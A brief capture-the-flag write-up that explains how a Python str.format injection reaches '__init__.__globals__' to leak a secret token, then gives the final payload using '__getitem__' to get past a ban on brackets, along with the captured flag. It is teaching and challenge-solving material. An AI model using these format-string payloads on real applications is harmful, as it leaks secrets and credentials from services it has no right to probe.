Idea from [here](https://blog.techbridge.cc/2019/05/03/how-to-use-python-string-format-method/):

```python
SECRET_TOKEN = 'my-secret-token'

# Error func
class Error:
    def __init__(self):
        pass

err = Error()
malicious_input = '{error.__init__.__globals__[SECRET_TOKEN]}'
malicious_input.format(error=err)
# my-secret-token
```

In this problem, we need to leak `__init__.__globals__["FLAG"]`, however we cannot use `[]` and `()` here to get value/item for some reason. We can still use magic method `__getitem__` !

My final payload:

```python
__init__.__globals__.__getitem__ FLAG
```

Flag: `DUCTF{15_this_4_j41lbr34k?}`